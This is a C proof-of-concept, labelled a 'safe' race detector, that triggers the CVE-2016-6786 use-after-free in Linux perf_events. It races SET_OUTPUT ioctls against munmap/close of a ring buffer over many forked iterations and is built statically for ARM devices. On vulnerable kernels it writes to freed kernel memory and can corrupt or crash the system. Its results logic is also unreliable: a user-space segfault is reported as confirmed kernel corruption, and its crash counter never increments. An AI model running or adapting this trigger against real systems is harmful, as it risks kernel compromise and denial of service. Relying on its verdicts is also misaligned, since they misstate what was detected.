/*
 * cve_2016_6786_race.c — CVE-2016-6786 race condition detector
 * 
 * Race: perf_event_set_output() vs close()/munmap() on the output event
 * If vulnerable, writing to a freed ring buffer → UAF → kernel code exec
 *
 * Strategy:
 *   Thread A: mmap fd1 buffer, SET_OUTPUT(fd2, fd1), then munmap+close fd1
 *   Thread B: simultaneously enable fd2 and generate events to write to buffer
 *   If kernel uses freed buffer → crash or detectable corruption
 *
 * SAFE VERSION: Detects race window without attempting exploitation.
 * Uses alarm() and child processes for safety.
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o cve_2016_6786_race cve_2016_6786_race.c -lpthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#define PERF_TYPE_SOFTWARE    1
#define PERF_COUNT_SW_CPU_CLOCK  0
#define PERF_COUNT_SW_TASK_CLOCK 1
#define PERF_COUNT_SW_PAGE_FAULTS 2

#define PERF_EVENT_IOC_ENABLE     0x2400
#define PERF_EVENT_IOC_DISABLE    0x2401
#define PERF_EVENT_IOC_RESET      0x2403
#define PERF_EVENT_IOC_SET_OUTPUT  0x2405

struct perf_event_attr {
    unsigned int type;
    unsigned int size;
    unsigned long long config;
    union {
        unsigned long long sample_period;
        unsigned long long sample_freq;
    };
    unsigned long long sample_type;
    unsigned long long read_format;
    unsigned long long flags;
    unsigned int wakeup_events;
    unsigned int wakeup_watermark;
    unsigned int bp_type;
    union {
        unsigned long long bp_addr;
        unsigned long long config1;
    };
    union {
        unsigned long long bp_len;
        unsigned long long config2;
    };
    unsigned long long branch_sample_type;
    unsigned long long sample_regs_user;
    unsigned long long sample_stack_user;
};

static long perf_event_open(struct perf_event_attr *attr, pid_t pid,
                            int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

/* Shared state for race threads */
static volatile int race_go = 0;
static volatile int race_done = 0;
static int target_fd = -1;       /* fd1 — the event whose buffer we race on */
static int output_fd = -1;       /* fd2 — event whose output we redirect */
static void *target_mmap = NULL;
static size_t mmap_size = 0;

/* Thread A: close the target fd (racing SET_OUTPUT with buffer teardown) */
static void *thread_close(void *arg) {
    while (!race_go) usleep(1); /* spin until go */
    
    /* Unmap and close target — this frees the ring buffer */
    if (target_mmap && target_mmap != MAP_FAILED) {
        munmap(target_mmap, mmap_size);
        target_mmap = MAP_FAILED;
    }
    if (target_fd >= 0) {
        close(target_fd);
        target_fd = -1;
    }
    
    race_done = 1;
    return NULL;
}

/* Thread B: redirect output to target's buffer (racing with buffer teardown) */
static void *thread_set_output(void *arg) {
    int ret;
    while (!race_go) usleep(1);
    
    /* Try to set output AFTER thread_close starts tearing down the buffer */
    ret = ioctl(output_fd, PERF_EVENT_IOC_SET_OUTPUT, target_fd);
    
    /* If this succeeds after target_fd is closed, we have a UAF */
    if (ret == 0) {
        /* Enable and generate events — if buffer is freed, this writes to freed memory */
        ioctl(output_fd, PERF_EVENT_IOC_ENABLE, 0);
        usleep(100); /* let some events accumulate */
        ioctl(output_fd, PERF_EVENT_IOC_DISABLE, 0);
    }
    
    return NULL;
}

static struct perf_event_attr make_attr(int config) {
    struct perf_event_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = config;
    attr.sample_period = 1;
    attr.sample_type = 1; /* PERF_SAMPLE_IP */
    attr.flags = 1; /* disabled */
    return attr;
}

/* Run one race iteration in a forked child for safety */
static int run_race_iteration(int iter) {
    struct perf_event_attr attr;
    pthread_t t_close, t_setout;
    
    race_go = 0;
    race_done = 0;
    mmap_size = (1 + 4) * 4096;
    
    /* Create target event (fd1) with mmap buffer */
    attr = make_attr(PERF_COUNT_SW_CPU_CLOCK);
    target_fd = perf_event_open(&attr, 0, -1, -1, 0);
    if (target_fd < 0) return -1;
    
    target_mmap = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, target_fd, 0);
    if (target_mmap == MAP_FAILED) {
        close(target_fd);
        return -1;
    }
    
    /* Create output event (fd2) */
    attr = make_attr(PERF_COUNT_SW_TASK_CLOCK);
    output_fd = perf_event_open(&attr, 0, -1, -1, 0);
    if (output_fd < 0) {
        munmap(target_mmap, mmap_size);
        close(target_fd);
        return -1;
    }
    
    /* First, successfully SET_OUTPUT fd2 -> fd1 */
    int ret = ioctl(output_fd, PERF_EVENT_IOC_SET_OUTPUT, target_fd);
    if (ret < 0) {
        close(output_fd);
        munmap(target_mmap, mmap_size);
        close(target_fd);
        return -1;
    }
    
    /* Now race: close fd1 while fd2 still points to fd1's buffer */
    pthread_create(&t_close, NULL, thread_close, NULL);
    pthread_create(&t_setout, NULL, thread_set_output, NULL);
    
    /* Vary timing */
    usleep(iter % 100);
    
    /* Signal go */
    race_go = 1;
    
    /* Wait for completion */
    pthread_join(t_close, NULL);
    pthread_join(t_setout, NULL);
    
    /* Cleanup */
    if (output_fd >= 0) close(output_fd);
    
    return 0;
}

/* 
 * Alternative race: mmap/munmap race
 * Thread 1: perf_event_open + mmap
 * Thread 2: concurrent munmap + perf_event_open (reuse fd)
 */
static volatile int mmap_race_go = 0;
static int shared_fds[64];
static int shared_fd_count = 0;

static void *thread_mmap_unmap(void *arg) {
    int idx = (int)(long)arg;
    while (!mmap_race_go) usleep(1);
    
    for (int i = 0; i < 100; i++) {
        int fd = shared_fds[idx % shared_fd_count];
        if (fd < 0) continue;
        
        void *m = mmap(NULL, (1+4)*4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
        if (m != MAP_FAILED) {
            /* Read a value from the header to detect corruption */
            volatile unsigned int val = *(unsigned int *)m;
            (void)val;
            munmap(m, (1+4)*4096);
        }
        usleep(10);
    }
    return NULL;
}

static void *thread_set_output_race(void *arg) {
    while (!mmap_race_go) usleep(1);
    
    for (int i = 0; i < 100; i++) {
        if (shared_fd_count < 2) break;
        int src = shared_fds[i % shared_fd_count];
        int dst = shared_fds[(i+1) % shared_fd_count];
        if (src < 0 || dst < 0) continue;
        
        ioctl(src, PERF_EVENT_IOC_SET_OUTPUT, dst);
        usleep(5);
    }
    return NULL;
}

static int run_mmap_race(int iterations) {
    struct perf_event_attr attr;
    pthread_t threads[8];
    int crashes = 0;
    
    printf("\n[*] PHASE 2: mmap/SET_OUTPUT concurrent race (%d iterations)\n", iterations);
    
    for (int round = 0; round < iterations; round++) {
        mmap_race_go = 0;
        shared_fd_count = 0;
        
        /* Open several events */
        for (int i = 0; i < 16; i++) {
            attr = make_attr(i % 5);
            shared_fds[i] = perf_event_open(&attr, 0, -1, -1, 0);
            if (shared_fds[i] >= 0) shared_fd_count++;
        }
        
        if (shared_fd_count < 4) {
            for (int i = 0; i < shared_fd_count; i++) close(shared_fds[i]);
            continue;
        }
        
        /* Start racing threads */
        for (int i = 0; i < 4; i++)
            pthread_create(&threads[i], NULL, thread_mmap_unmap, (void*)(long)i);
        for (int i = 4; i < 8; i++)
            pthread_create(&threads[i], NULL, thread_set_output_race, NULL);
        
        mmap_race_go = 1;
        
        for (int i = 0; i < 8; i++)
            pthread_join(threads[i], NULL);
        
        /* Cleanup */
        for (int i = 0; i < 16; i++) {
            if (shared_fds[i] >= 0) close(shared_fds[i]);
        }
        
        if (round % 100 == 0) {
            printf("    Round %d/%d...\r", round, iterations);
            fflush(stdout);
        }
    }
    
    printf("    Completed %d rounds, %d anomalies\n", iterations, crashes);
    return crashes;
}

int main(int argc, char *argv[]) {
    int iterations = 1000;
    int mmap_rounds = 500;
    
    if (argc > 1) iterations = atoi(argv[1]);
    if (argc > 2) mmap_rounds = atoi(argv[2]);
    
    printf("=== CVE-2016-6786 Race Detector ===\n");
    printf("PID=%d, UID=%d\n", getpid(), getuid());
    printf("Iterations: %d close-race, %d mmap-race\n\n", iterations, mmap_rounds);
    
    /* PHASE 1: close/SET_OUTPUT race in forked children */
    printf("[*] PHASE 1: SET_OUTPUT vs close() race (%d iterations)\n", iterations);
    
    int hangs = 0;
    int errors = 0;
    int completed = 0;
    
    for (int i = 0; i < iterations; i++) {
        pid_t child = fork();
        if (child == 0) {
            /* Child — run the race */
            alarm(3); /* kill child if it hangs */
            int ret = run_race_iteration(i);
            _exit(ret < 0 ? 1 : 0);
        }
        
        int status;
        int waited = 0;
        for (int j = 0; j < 50; j++) {
            pid_t w = waitpid(child, &status, WNOHANG);
            if (w > 0) { waited = 1; break; }
            usleep(100000); /* 100ms */
        }
        
        if (!waited) {
            /* Child hung — kill it */
            kill(child, SIGKILL);
            waitpid(child, &status, 0);
            hangs++;
            printf("    [!] HANG at iteration %d — possible race hit!\n", i);
        } else if (WIFSIGNALED(status)) {
            int sig = WTERMSIG(status);
            printf("    [!] CRASH at iteration %d — signal %d!\n", i, sig);
            if (sig == 11 || sig == 7) { /* SIGSEGV or SIGBUS */
                printf("    [!!!] KERNEL CORRUPTION DETECTED — CVE-2016-6786 CONFIRMED!\n");
                return 0;
            }
        } else {
            completed++;
        }
        
        if (i % 100 == 0 && i > 0) {
            printf("    Progress: %d/%d (hangs=%d, errors=%d)\n",
                   i, iterations, hangs, errors);
        }
    }
    
    printf("    PHASE 1 done: %d completed, %d hangs, %d errors\n\n",
           completed, hangs, errors);
    
    /* PHASE 2: mmap/SET_OUTPUT concurrent race (in-process) */
    run_mmap_race(mmap_rounds);
    
    printf("\n=== Results ===\n");
    if (hangs > 0) {
        printf("[!] %d HANGS detected — race window exists!\n", hangs);
        printf("    Further investigation needed with targeted timing.\n");
    } else {
        printf("Race not triggered in %d iterations.\n", iterations + mmap_rounds);
        printf("May need more iterations or different timing strategy.\n");
    }
    
    return 0;
}
